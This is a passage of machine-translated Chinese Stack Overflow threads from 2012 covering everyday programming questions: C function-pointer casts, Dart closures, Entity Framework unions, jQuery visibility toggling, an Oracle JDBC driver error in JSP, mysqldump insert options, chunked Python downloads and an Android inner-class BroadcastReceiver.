同样，在函数指针之间转换然后通过错误的指针调用也是未定义的行为。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-09T16:41:48.713

任何符合标准的 C 编译器都需要一致地实现某些构造，并且 99% 的 C 编译器确实一致地实现了某些构造，但符合标准的编译器可以自由地以不同的方式实现。尝试将指向采用一种类型指针的函数的指针转换为指向采用另一种类型指针的函数的指针属于后一类。尽管 C 标准规定 a`void*`和 a`char*`大小必须相同，没有什么要求它们共享相同的位级存储格式，更不用说参数传递约定了。虽然大多数机器允许以与字几乎相同的方式访问字节，但这种能力并不普遍。application-binary-interface [指定如何将参数传递给例程的文档] 的设计者可能会指定 a`char*`以最大化字节访问效率的方式传递，而 a`void*`应该以一种方式传递最大限度地提高字访问的效率，同时保留保持未对齐字节地址的能力，可能通过使用补充字来保持零或一来指示 LSB/MSB）。在这样的机器上，有一个例程期望`void*`从期望传递的代码调用`char*`可能导致例程访问任意错误数据。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-04-24T20:07:29.587

不，使用什么数据类型来存储数据并不重要。只有 C 用于读取和写入该数据的类型以及数据是否足够大才重要。

# dart - 将函数/方法分配给 Dart 中的变量

> ID：10305195
> 
> 赞同：16
> 
> 时间：2012-04-24T20:03:08.627
> 
> 标签：dart

Dart 是否支持变量函数/方法的概念？因此，通过存储在变量中的名称来调用方法。

例如在 PHP 中，这不仅可以用于方法：

```
// With functions...
function foo()
{
    echo 'Running foo...';
}

$function = 'foo';
$function();

// With classes...
public static function factory($view)
{
    $class = 'View_' . ucfirst($view);
    return new $class();
} 
```

我没有在语言导览或 API 中找到它。其他方法可以做这样的事情吗？

提前致谢。

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-04-24T20:36:54.237

要将函数的名称存储在变量中并稍后调用它，您必须等到反射到达 Dart（或使用[noSuchMethod](http://api.dartlang.org/dart_core/Object.html#noSuchMethod)[获得创意](http://dartwatch.com/index.php/2012/04/playing-with-nosuchmethod-raises-some-questions/)）。但是，您可以将函数直接存储在 JavaScript 等变量中

```
main() {
  var f = (String s) => print(s);
  f("hello world");
} 
```

甚至内联它们，如果你正在做recusion，它会派上用场：

```
main() {
   g(int i) {
      if(i > 0) {
         print("$i is larger than zero");
         g(i-1);
      } else {
         print("zero or negative");
      } 
   }
   g(10);
} 
```

然后可以将存储的函数传递给其他函数

```
main() {
   var function;
   function = (String s) => print(s);
   doWork(function);
}

doWork(f(String s)) {
   f("hello world");
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2018-11-23T09:38:50.813

我可能不是最好的解释者，但您可能会认为这个示例具有更广泛的将函数分配给变量的范围，并且还使用闭包函数作为函数的参数。

```
 void main() {
      // a closure function assigned to a variable.
      var fun = (int) => (int * 2); 
      // a variable which is assigned with the function which is written below
      var newFuncResult = newFunc(9, fun); 
      print(x); // Output: 27
    }

    //Below is a function with two parameter (1st one as int) (2nd as a closure function)
        int newFunc(int a, fun) {
          int x = a;
          int y = fun(x);
          return x + y;
        } 
```

# c# - 实体框架 - 在一个查询中有条件地从主表和历史表中提取数据

> ID：10305198
> 
> 赞同：3
> 
> 时间：2012-04-24T20:03:11.830
> 
> 标签：c#, entity-framework

我在 SQL Server 数据库中定义了以下 2 个表：

```
 CREATE TABLE [dbo].[FinancialItem](
    [Id][bigint] identity(1,1) NOT NULL,
    [TranId] [int] NOT NULL,
    [Installment][int] NOT NULL,
    [Amount][decimal](16,2) NOT NULL
   CONSTRAINT [FinancialItem0] PRIMARY KEY
   (
     [Id] ASC
   )

  CREATE TABLE [dbo].[FinancialItemHistory](
    [Id][bigint] NOT NULL,
    [TranId] [int] NOT NULL,
    [Installment][int] NOT NULL,
    [Amount][decimal](16,2) NOT NULL
   CONSTRAINT [FinancialItemHistory0] PRIMARY KEY
   (
     [Id] ASC
   ) 
```

我将 Entity Framework 4.x 与 POCO 实体一起使用。

实体框架代码不会将任何数据写入数据库，它只是用于读取另一个服务创建的数据。如果可能的话，我想做的是让一个实体代表这两个表。FinancialItem 和 FinancialItemHistory 表具有相同的结构。当一个 FinancialItem 得到还清时，记录从 FinancialItem 表移动到 FinancialItemHistory 表（它保持相同的 Id）。如果我包括已付清的项目，实体框架中是否可以有条件地提取 FinancialItemHistory 记录？我是否应该在数据库中创建一个基本上执行此操作的视图：

```
SELECT Id, TranId, Installment, Amount, 0 IsHistorical
FROM FinancialItem
UNION ALL
SELECT Id, TranId, Installment, Amount, 1 IsHistorical
FROM FinancialItemHistory 
```

如果可能，我想避免使用视图，因为更多时候我只想提取驻留在 FinancialItem 表中的未付款项。我尝试让两个实体都从同一个接口（IFinancialItem）派生，然后让实体框架查询该接口，但似乎实体框架不支持映射到 IQueryable 上下文中的复杂类型。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-24T20:05:08.613

在实体框架中，您`union all`使用该`Concat`方法。如果你想联合两种不同的类型，你需要先把它们都转换成一个普通的类型，像这样：

```
var table1 = ...;
var table1 = ...;
var unionAll = table1.Select(x => new { x.ID, ... }).Concat(table2.Select(x => new { x.ID, ... })); 
```

# jquery - jQuery 检查隐藏的 DIV 然后显示消息

> ID：10305208
> 
> 赞同：2
> 
> 时间：2012-04-24T20:03:53.257
> 
> 标签：jquery

我有一些代码，我根据 2 个选择下拉菜单中的选择显示/隐藏 DIV。这很好用。现在，当没有任何选择匹配时，我试图显示“无结果”消息。

[我的小提琴](http://jsfiddle.net/Psykopup/hDWAh/)

它几乎可以工作了。问题是“无结果”消息在需要时显示，但在应该时不隐藏。任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-24T20:07:27.480

您似乎缺少清空 NoResults 类内容的条件。我将小提琴编辑为：

```
if ($('.item:visible').length === 0) {
   $(".NoResults").html("<p>No events for your selection.</p>");
 } else { // NEW ELSE CLAUSE
   $(".NoResults").empty();
 } 
```

编辑：虽然这可行，但我建议使用下面的 RepWhoringPeeHaa 解决方案，使用 show()/hide() 而不是直接设置内容。

我对该解决方案的主要论点是它在 html 模板中保留了更多内容（“没有供您选择的事件。”），并且在代码之外。将内容/代码分离得越好，将来更新内容就越容易。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-24T20:07:53.230

您可以[将内容设置为空](http://jsfiddle.net/hDWAh/14/)：

```
 if ($('.item:visible').length === 0) {
            $(".NoResults").html("<p>No events for your selection.</p>");
        } else {
            $(".NoResults").html('');
        } 
```

或者默认情况下将文本添加到`NoResults`元素中并默认使用 CSS 将其隐藏 ( `display: none`)。[然后切换到显示/隐藏](http://jsfiddle.net/hDWAh/12/)。

```
 if ($('.item:visible').length === 0) {
            $(".NoResults").show();
        } else {
            $(".NoResults").hide();
        } 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-24T20:06:48.287

检查无结果后添加 else 语句：

```
 if ($('.item:visible').length === 0) {
            $(".NoResults").html("<p>No events for your selection.</p>");
        }
        else $(".NoResults").html(""); 
```

这是您更新的 jsFiddle：http: [//jsfiddle.net/hDWAh/8/](http://jsfiddle.net/hDWAh/8/)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-24T20:07:28.453

```
if ($('.item:visible').length === 0)
    $(".NoResults").html("<p>No events for your selection.</p>");
else   // <==============
    $(".NoResults").empty(); // <============== 
```

[**更新小提琴**](http://jsfiddle.net/hDWAh/6/)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-24T20:07:02.893

一种方法是每次切换可见性，

[http://jsfiddle.net/hDWAh/7/](http://jsfiddle.net/hDWAh/7/)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-04-24T20:07:34.220

因为代码是从上到下运行的，所以总是从隐藏开始`noresult`，当它应该显示时，就这样显示：

[http://jsfiddle.net/hDWAh/4/](http://jsfiddle.net/hDWAh/4/)

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-04-24T20:07:52.240

```
if ($('.item:visible').length === 0) {
    $(".NoResults").html("<p>No events for your selection.</p>");
}
else{
 $(".NoResults").html("");
} 
```

# excel - 将 Excel 工作表导入 SQL Server，跳过主键违规

> ID：10305216
> 
> 赞同：1
> 
> 时间：2012-04-24T20:04:36.783
> 
> 标签：excel, sql-server-2008, ssis

我想将一个 Excel 文件导入到 SQL Server 中的表中。该表有 3 或 4 列组合成一个主键。我希望能够随时运行导入，如果与主键发生冲突，只需不导入该行，而是继续导入所有其他行。

我创建了一个 *.dtsx 文件，它可以很好地导入，但是在找到重复键的那一刻就死了。有没有办法告诉 *.dtsx 文件在找到重复文件时继续，而不仅仅是死掉？我尝试打开 *.dtsx 文件，但没有太多选项，当我右键单击 *.dtsx 文件并选择编辑时，Visual Studio 打开并显示给我一些编辑 *.dtsx 文件的方法，但是我一点也不熟悉。非常感谢任何指导！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-24T22:20:32.330

OleDBDestination 组件上有一个“检查约束”复选框，用于忽略 PK 等约束，但我认为它不会解决您的问题。

理想的做法是在源组件和目标组件之间添加一个查找组件以检查数据库中是否已存在该行，并且仅在它不存在时插入。

我知道您说过您不了解 SSIS，但这是您可能必须采用的方法。像这样创建\编辑一个简单的包一点也不难。[这](https://stackoverflow.com/questions/1155804/ssis-performing-a-lookup-on-another-table-to-get-related-column)是论坛上的一个例子

# oracle - 使用 JSP 从 Oracle 10g DB 没有返回数据记录

> ID：10305227
> 
> 赞同：0
> 
> 时间：2012-04-24T20:05:24.283
> 
> 标签：oracle, jsp, jdbc, oracle10g

我在我的 jsp 页面的正文部分插入了以下 java 代码，以从 Oracle 10g 数据库中检索表 FLIGHTDATA 的记录。但是在执行 Class.forName(...) 行之后，程序直接进入 finally 阻塞并关闭连接而不返回任何数据。关于我做错了什么的任何建议？谢谢 - 索姆纳特

```
<%@ page import="java.sql.*" %>
<%@ page import="java.io.*" %>

<%
out.println("<table border='1'><tr>");
Connection connection = null;
Statement statement = null;
ResultSet rs_1hop = null;
ResultSetMetaData rsm_1hop = null;
try {
Class.forName("oracle.jdbc.driver.OracleDriver");
String connectionURL = "jdbc:oracle:thin:@localhost:1521:xe";
connection = DriverManager.getConnection(connectionURL, "system", "system");
statement = connection.createStatement();
// sql query to retrieve values from the secified table.
String QueryString = "SELECT * from FLIGHTDATA";
rs_1hop = statement.executeQuery(QueryString);
rsm_1hop = rs_1hop.getMetaData();
int colCnt = rsm_1hop.getColumnCount();

for (int i=1; i<=colCnt; ++i) {
    out.println("<th>" + rsm_1hop.getColumnName(i) + "</th>");
}
out.println("</tr>");

while (rs_1hop.next()) {
    out.println("<tr>");
    for (int i=1; i<=colCnt; ++i)
        out.println("<td>" + rs_1hop.getString(i) + "</td>");
    out.println("</tr>");
}

} catch (Exception e) {

} finally {
    if (statement != null)
        statement.close();
    if (connection != null)
        connection.close();
}
out.println("</table><br><br>");
%> 
```

在按照 BalusC 的注释在 catch 块中添加 ServletException 并在 /WEB-INF/lib 下添加 odbc6.jar 文件后，我收到以下错误消息，我认为这是由于找不到 jdbc 驱动程序。

我还尝试在 Apache Tomcat 安装目录 /ROOT/web-apps/WEB_INF/lib 下添加 jar 文件，以便它们可用于所有 Web 应用程序，但问题仍然存在。

```
description The server encountered an internal error () that prevented it from fulfilling this request.

exception

org.apache.jasper.JasperException: javax.servlet.ServletException: DB interaction failed!           org.apache.jasper.servlet.JspServletWrapper.handleJspException(JspServletWrapper.java:500)
    org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:410)
    org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:313)
    org.apache.jasper.servlet.JspServlet.service(JspServlet.java:260)
    javax.servlet.http.HttpServlet.service(HttpServlet.java:717) 
```

根本原因

```
javax.servlet.ServletException: DB interaction failed!
     org.apache.jsp.retrievePossibleRoutes_jsp._jspService(retrievePossibleRoutes_jsp.java:96)
    org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)
    javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
    org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:386)
    org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:313)
    org.apache.jasper.servlet.JspServlet.service(JspServlet.java:260)
    javax.servlet.http.HttpServlet.service(HttpServlet.java:717) 
```

根本原因

```
java.lang.ClassNotFoundException: oracle.jdbc.driver.OracleDriver
    org.apache.catalina.loader.WebappClassLoader.loadClass(WebappClassLoader.java:1680)
    org.apache.catalina.loader.WebappClassLoader.loadClass(WebappClassLoader.java:1526)
    org.apache.jasper.servlet.JasperLoader.loadClass(JasperLoader.java:128)
    org.apache.jasper.servlet.JasperLoader.loadClass(JasperLoader.java:66)
    java.lang.Class.forName0(Native Method)
    java.lang.Class.forName(Unknown Source)
    org.apache.jsp.retrievePossibleRoutes_jsp._jspService(retrievePossibleRoutes_jsp.java:73)
    org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)
    javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
    org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:386)
    org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:313)
    org.apache.jasper.servlet.JspServlet.service(JspServlet.java:260)
    javax.servlet.http.HttpServlet.service(HttpServlet.java:717) 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-24T20:07:26.177

> *但是在 Class.forName(...) 行执行后，程序直接进入 finally 块*

只有`ClassNotFoundException`在抛出 a 时才会发生这种情况。这意味着给定类名指定的具体类根本不在 webapp 的运行时类路径中。该类是 Oracle JDBC 驱动程序的一部分。将 Oracle JDBC 驱动程序 JAR 文件放在`/WEB-INF/lib`webapp 的文件夹中应该可以解决该问题。

此外，我强烈建议您在该空块中执行*某些*`catch (Exception e) {}`操作以指示发生了异常。现在，你在黑暗中对真正发生的事情一无所知。如果您将它重新抛出为`ServletException`，那么您将得到一个更加不言自明的错误页面，而不是半生不熟的 JSP 结果。

```
} catch (Exception e) {
    throw new ServletException(e);    
} 
```

最后但同样重要的是，在 JSP 文件中编写 Java 代码是一种[不好的做法](https://stackoverflow.com/questions/3177733/how-to-avoid-java-code-in-jsp-files/3180202#3180202)。如何正确解决这个问题，请查看以下答案：[Show JDBC ResultSet in HTML in JSP page using MVC and DAO pattern](https://stackoverflow.com/questions/5003142/jsp-using-mvc-and-jdbc/5003701#5003701)。

* * *

**根据您的更新进行更新**：****

 **> *在按照 BalusC 的注释在 catch 块中添加 ServletException 并在 /WEB-INF/lib 下添加 odbc6.jar 文件后，我收到以下错误消息，我认为这是由于找不到 jdbc 驱动程序。*

那么它是错误的 JAR 文件（即它不是包含`oracle.jdbc.driver.OracleDriver`该类的文件），或者您没有正确重建/重新部署/重新启动 web 应用程序。确保您已下载[此处](http://www.oracle.com/technetwork/database/features/jdbc/index-091264.html)列出的适用于您的 Oracle 数据库版本的正确 JDBC 驱动程序。确保您已正确重建/重新部署/重新启动 web 应用程序。

* * *

> *我还尝试在 Apache Tomcat 安装目录 /ROOT/web-apps/WEB_INF/lib 下添加 jar 文件，以便它们可用于所有 Web 应用程序，但问题仍然存在。*

这是无稽之谈。撤消此更改。要使 JAR 可用于所有已部署的 Web 应用程序，请将其放在 Tomcat 自己的`/lib`文件夹中（直接在 Tomcat 安装文件夹中）。但是如果它是错误的 JAR 文件，那将无法解决您的问题。**

# javascript - 用于 Python 实现的测试套件？

> ID：10305231
> 
> 赞同：3
> 
> 时间：2012-04-24T20:05:35.633
> 
> 标签：javascript, python, python-3.x, python-2.7

我已经实现了 Python 的一个子集，我需要找到一些用于测试 Python 实现的测试套件（是的，语言本身），比如 SpiderMonkey 用来测试 Javascript 实现的测试套件，所以我我期待一些权威的或开源的被广泛（或实际）使用的......

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-24T20:23:11.793

如果您从[http://hg.python.org/cpython/](http://hg.python.org/cpython/)下载 CPython 源代码，您会在`Lib/tests`. 这些可能会有一些用处。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-01-05T09:38:22.003

是的，您可以在 python 解释器中运行 CPython 测试套件。

您应该将 python 安装中的测试包放在文件中`PREFIX/lib/pythonX.Y/test/__init__.py`，或者您可以使用上面的命令找到它：

```
$ ls -1F $(python -c 'import test; import os; print(test.__file__)') 
```

为了运行测试套件，您只需键入：

```
>>> from test import autotest 
```

来源：[https ://docs.python.org/devguide/runtests.html](https://docs.python.org/devguide/runtests.html)

# java - 是否可以在不同窗口中调试 eclipse 中的多个线程？

> ID：10305232
> 
> 赞同：14
> 
> 时间：2012-04-24T20:05:38.740
> 
> 标签：java, eclipse, multithreading, debugging

我有两个监视器，如果能够有两个 Eclipse 窗口，每个窗口都针对同一 jvm 的不同线程运行调试器会很方便。

现在我必须继续进入调试视图并单击另一个线程以切换到它的上下文。同时在屏幕上显示两种上下文会使事情变得容易得多。

有没有办法在eclipse中做到这一点？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-04-24T20:41:11.570

> 是否可以在不同窗口中调试 eclipse 中的多个线程？

好吧，我只是尝试了一下，它有点工作。您不需要多台显示器即可尝试。

1.  我创建了 2 个线程并在它们的每个方法中放置了断点`run()`。
2.  我运行了应用程序，2 个线程显示为暂停。
3.  我将 Eclipse Window 菜单下拉到 New Window。新的完整 Eclipse 窗口应该有一个调试选项卡供您查看。
4.  我可以在每个线程中来回切换和走动。

这可行，但即使有 2 个“调试”选项卡，它们也会有所连接。当我在 Thread-1 调试窗口中前进时，焦点变为 Thread-1——即使在另一个 Thread-2 窗口中也是如此。

**编辑：**

实际上我玩了更多，它似乎工作得很好。如果我切换到另一个窗口调试 Thread-2 和 step，它会扩展 Thread-1 窗口中的 Thread-2 堆栈跟踪，但实际上似乎并没有改变突出显示。我可以回到 Thread-1 窗口并在 Thread-1 中轻松前进。

我不知道有什么方法可以创建两个未完全连接的单独调试窗口。网络搜索也是空的。

# sql - sql server CONTINUE_AFTER_ERROR

> ID：10305239
> 
> 赞同：1
> 
> 时间：2012-04-24T20:06:05.993
> 
> 标签：sql, sql-server, database

我正在尝试恢复数据库，但收到错误消息：Page(0 0) 中发生错误。

当我用谷歌搜索时，建议将选项“错误后继续”设置为真。我不确定如何将此选项设置为 true？

我正在做的是 - 右键单击​​数据库，选择恢复数据库，然后选择备份文件。

有人请帮忙吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-24T20:08:25.773

当第一页损坏时，无法恢复备份。我的猜测是这个文件甚至不是备份文件。

# r - 在成对的列上执行功能

> ID：10305240
> 
> 赞同：1
> 
> 时间：2012-04-24T20:06:08.633
> 
> 标签：r

我正在尝试对动物位置数据进行一些蒙特卡罗模拟。到目前为止，我已经对 100 个 X 和 Y 坐标进行了 100 次采样。这会产生一个包含 200 个的列表。然后我将此列表转换为一个数据框，该数据框更有助于我想为每个样本 (kernel.area) 运行的最终函数。

现在我有一个包含 200 列的数据框，我想使用每对连续的列来执行 kernel.area 函数。

我不能在这里很好地重现我自己的数据，所以我试图给出一个基本的例子来展示我正在使用的数据框的结构。到目前为止，我已经包含了我尝试过的 for 循环，但我仍然是 R 新手，如果有任何建议，我将不胜感激。

```
# generate dataframe representing X and Y positions
df <- data.frame(x=seq(1:200),y=seq(1:200)) 

# 100 replications of sampling 100 "positions"
resamp <- replicate(100,df[sample(nrow(df),100),])

# convert to data frame (kernel.area needs an xy dataframe)
df2 <- do.call("rbind", resamp[1:2,])
# xy positions need to be in columns for kernel.area
df3 <- t(df2)

#edit: kernel.area requires you have an id field, but I am only dealing with one individual, so I'll construct a fake one of the same length as the positions
id=replicate(100,c("id"))
id=data.frame(id) 
```

这是我尝试过的 for 循环的结构（从第一篇文章开始编辑）：

```
for (j in seq(1,ncol(df3)-1,2)) { 
  kud <- kernel.area(df3[,j:(j+1)],id=id,kern="bivnorm",unin=c("m"),unout=c("km2"))
  print(kud)
} 
```

我的最终目标是计算`kernel.area`每个重采样事件（即每对最多 200 列的行 1:100），并能够将结果组合到数据框中。但是，运行循环后，我收到以下错误消息：

```
Error in df[, 1] : incorrect number of dimensions 
```

编辑：我意识到我的 id 格式与我的数据框不同，所以我更改了它，现在出现错误：

```
Error in kernelUD(xy, id, h, grid, same4all, hlim, kern, extent) : 
id should have the same length as xy 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-24T21:11:16.967

首先，免责声明：我从未使用过 package `adehabitat`，它有一个 function `kernel.area`，我假设你正在使用它。也许您可以确认哪个包包含有问题的功能。

* * *

不过，我认为我可以提出一些建议，这些建议与特定软件包的知识无关。

1.  首先在于创造`df3`。这可能应该是 `df3 <- t(df2)`，但这很可能在您的实际代码中是正确的，只是您帖子中的一个错字。

2.  第二个建议与您`df3`在循环中子集的方式有关。`j:j+1`只是一个数字，因为 的`:`优先级高于`+`（请参阅`?Syntax`在 R 中进行数学运算的顺序）。要获得所需的两列，请`j:(j+1)`改用。

* * *

**编辑：**

在加载时`adehabitat`，我被警告“小心”并使用相关的新包，其中是`adehabitatHR`，它还包含一个功能`kernel.area`。这个函数的语法和行为略有不同，但也许值得研究一下。使用`adehabitatHR`（我必须从源代码安装，因为该包不适用于 R 2.15.0），我能够执行以下操作。

```
library(adehabitatHR)

for (j in seq(1,ncol(df3)-1,2)) { 
  kud <-kernelUD(SpatialPoints(df3[,j:(j+1)]),kern="bivnorm")
  kernAr<-kernel.area(kud,unin=c("m"),unout=c("km2"))
  print(kernAr)
}

detach(package:adehabitatHR, unload=TRUE) 
```

这会打印一些东西，正如下面的评论中提到的那样，`kernelUD()`它被称为 before `kernel.area()`。

# mysql - 如何在 sql 转储中获得完整的语法？

> ID：10305246
> 
> 赞同：4
> 
> 时间：2012-04-24T20:06:55.747
> 
> 标签：mysql, mysqldump

我正在尝试备份数据库，但出于版本控制的目的，我想要完整的插入语句，如下所示：

```
INSERT INTO `table_name` (`id`, `type`) VALUES (1, 2);
INSERT INTO `table_name` (`id`, `type`) VALUES (2, 2); 
```

而不是默认值：

```
INSERT INTO `table_name` (`id`, `type`) VALUES (1, 2), (2, 2); 
```

我这样做的主要原因是它将所有插入值放在它们自己的行上，而不是整个表的一行。

我尝试以各种格式添加`--complete-inserts`and `--extended-inserts`（同时添加一个和两个），到目前为止，我还没有看到 mysqldump 生成的 sql 文件有任何变化。

这是我的查询，使用完整、扩展和详细标志：

```
mysqldump -cev --user=<user> --password=<password> <dbname> > <file_location>/backup.sql 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-24T20:20:43.090

这是您正在寻找的选项：

```
--skip-extended-insert 
```

# python - 用python下载大zip文件

> ID：10305249
> 
> 赞同：2
> 
> 时间：2012-04-24T20:07:11.980
> 
> 标签：python, download, urllib2, zipfile

我有多个返回 zip 文件的 URL。大多数文件，我可以使用 urllib2 库下载如下：

```
request = urllib2.urlopen(url)
zip_file = request.read() 
```

我遇到的问题是其中一个文件的大小为 35Mb（压缩），我永远无法使用此库完成下载。我可以正常使用 wget 和浏览器下载它。

我曾尝试像这样以块的形式下载文件：

```
request = urllib2.urlopen(url)
buffers = []
while True:
    buffer = request.read(8192)
    if buffer:
        buffers.append(buffer)
    else:
        break
final_file = ''.join(buffers) 
```

但这也没有完成下载。没有引发错误，因此很难调试正在发生的事情。不幸的是，我无法在此处发布 url / 文件的示例。

有什么建议/意见吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-24T20:25:30.317

这是我的应用程序的复制/粘贴，它下载了它自己的更新安装程序。它以块为单位读取文件并立即将块保存在磁盘上的输出文件中。

```
def DownloadThreadFunc(self):
    try:
        url = self.lines[1]
        data = None
        req = urllib2.Request(url, data, {})
        handle = urllib2.urlopen(req)

        self.size = int(handle.info()["Content-Length"])
        self.actualSize = 0
        name = path.join(DIR_UPDATES, url.split("/")[-1])
        blocksize = 64*1024

        fo = open(name, "wb")
        while not self.terminate:
            block = handle.read(blocksize)
            self.actualSize += len(block)
            if len(block) == 0:
                break
            fo.write(block)
        fo.close()
    except (urllib2.URLError, socket.timeout), e:
        try:
            fo.close()
        except:
            pass
        error("Download failed.", unicode(e)) 
```

我使用`self.size`and`self.actualSize`在 GUI 线程中显示下载进度，并`self.terminate`在需要时从 GUI 按钮取消下载。

# android - BroadcastReceiver：无法实例化类；没有空的构造函数

> ID：10305261
> 
> 赞同：38
> 
> 时间：2012-04-24T20:07:41.410
> 
> 标签：android, broadcastreceiver

我有内部类作为广播接收器：

```
public class ManualBacklightReceiver extends BroadcastReceiver {

    public static final String ACTION_MANUAL_BACKLIGHT = "com.android.systemui.statusbar.powerwidget.MANUAL_BACKLIGHT";

    public ManualBacklightReceiver() {
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        Log.d("ManualBacklightReceiver", intent.getAction());
    }

}; 
```

安卓清单：

```
<receiver android:name=".statusbar.powerwidget.PowerWidgetGrid$ManualBacklightReceiver">
        <intent-filter>
            <action android:name="com.android.systemui.statusbar.powerwidget.MANUAL_BACKLIGHT"/>
        </intent-filter>            
    </receiver> 
```

当我使用此代码发送意图时： Intent intent = new Intent();

```
intent.setAction("com.android.systemui.statusbar.powerwidget.MANUAL_BACKLIGHT");
intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
mContext.sendBroadcast(intent); 
```

我得到这些例外：

```
java.lang.RuntimeException: Unable to instantiate receiver com.android.systemui.statusbar.powerwidget.PowerWidgetGrid$ManualBacklightReceiver:
java.lang.InstantiationException: can't instantiate class com.android.systemui.statusbar.powerwidget.PowerWidgetGrid$ManualBacklightReceiver; no empty constructor
Caused by: java.lang.InstantiationException: can't instantiate class com.android.systemui.statusbar.powerwidget.PowerWidgetGrid$ManualBacklightReceiver; no empty constructor 
```

但我有一个空的构造函数！为什么它不起作用？

* * *

## 回答 #1

> 赞同：121
> 
> 时间：2012-04-24T20:13:25.323

您需要将内部类声明为静态。否则，内部类与外部类的*实例相关联。*

查看[Java 嵌套类教程](http://docs.oracle.com/javase/tutorial/java/javaOO/nested.html)了解详细信息。这是一个片段：

> InnerClass 的实例只能存在于 OuterClass 的实例中，并且可以直接访问其封闭实例的方法和字段。下图说明了这个想法。

和：

> 嵌套类是其封闭类的成员。非静态嵌套类（内部类）可以访问封闭类的其他成员，即使它们被声明为私有。静态嵌套类无权访问封闭类的其他成员。作为 OuterClass 的成员，嵌套类可以声明为私有、公共、受保护或包私有。（回想一下，外部类只能声明为公共的或包私有的。）

# java - Java.lang.nullpointer 异常（字 体）

> ID：10305264
> 
> 赞同：-1
> 
> 时间：2012-04-24T20:07:46.817
> 
> 标签：java, android, font-face

所以可以说我有这样的活动：

```
public class display_score extends Activity implements OnClickListener {

    Button back;
    TextView txt1;
    TextView txt2;
    TextView txt3;
    TextView txt4;
    TextView txt5;

    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, 
                                WindowManager.LayoutParams.FLAG_FULLSCREEN);

        setContentView(R.layout.display_highscore);

       back = (Button) findViewById(R.id.button1);
        back.setOnClickListener(this);

        txt1 = (TextView) findViewById(R.id.textView1);
        txt2 = (TextView) findViewById(R.id.textView2);
        txt3 = (TextView) findViewById(R.id.textView3);
        txt4 = (TextView) findViewById(R.id.textView4);
        txt5 = (TextView) findViewById(R.id.textView5);

        txt1.setText("1\. "+score.scores.getString("NAME","")+" "+String.valueOf(score.scores.getInt("SCORE",0)));
        txt2.setText("2\. "+score.scores.getString("NAME2","")+" "+String.valueOf(score.scores.getInt("SCORE2",0)));
        txt3.setText("3\. "+score.scores.getString("NAME3","")+" "+String.valueOf(score.scores.getInt("SCORE3",0)));
        txt4.setText("4\. "+score.scores.getString("NAME4","")+" "+String.valueOf(score.scores.getInt("SCORE4",0)));
        txt5.setText("5\. "+score.scores.getString("NAME5","")+" "+String.valueOf(score.scores.getInt("SCORE5",0)));

        txt1.setTypeface(Typeface.createFromAsset(getAssets(),"game_over.ttf"));
        txt2.setTypeface(Typeface.createFromAsset(getAssets(),"game_over.ttf"));
        txt3.setTypeface(Typeface.createFromAsset(getAssets(),"game_over.ttf"));
        txt4.setTypeface(Typeface.createFromAsset(getAssets(),"game_over.ttf"));
        txt5.setTypeface(Typeface.createFromAsset(getAssets(),"game_over.ttf"));

        txt1.setTextColor(Color.BLACK);
        txt2.setTextColor(Color.BLACK);
        txt3.setTextColor(Color.BLACK);
        txt4.setTextColor(Color.BLACK);
        txt5.setTextColor(Color.BLACK);

    }

    @Override
    public void onClick(View v) {
        finish();

    }

    @Override
    public void onBackPressed() {
        super.onBackPressed();
        finish();
    }

} 
```

和这样的布局：

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:gravity="bottom"
    android:orientation="vertical" 
    android:background="@drawable/background">

    <TextView
        android:id="@+id/textView1"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:gravity="center"
        android:text="1"
        android:textAppearance="?android:attr/textAppearanceLarge" />

    <TextView
        android:id="@+id/textView2"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:gravity="center"
        android:text="2"
        android:textAppearance="?android:attr/textAppearanceLarge" />

    <TextView
        android:id="@+id/textView3"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:gravity="center"
        android:text="3"
        android:textAppearance="?android:attr/textAppearanceLarge" />

    <TextView
        android:id="@+id/textView4"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:gravity="center"
        android:text="4"
        android:textAppearance="?android:attr/textAppearanceLarge" />

    <TextView
        android:id="@+id/textView5"
        android:layout_width="match_parent"
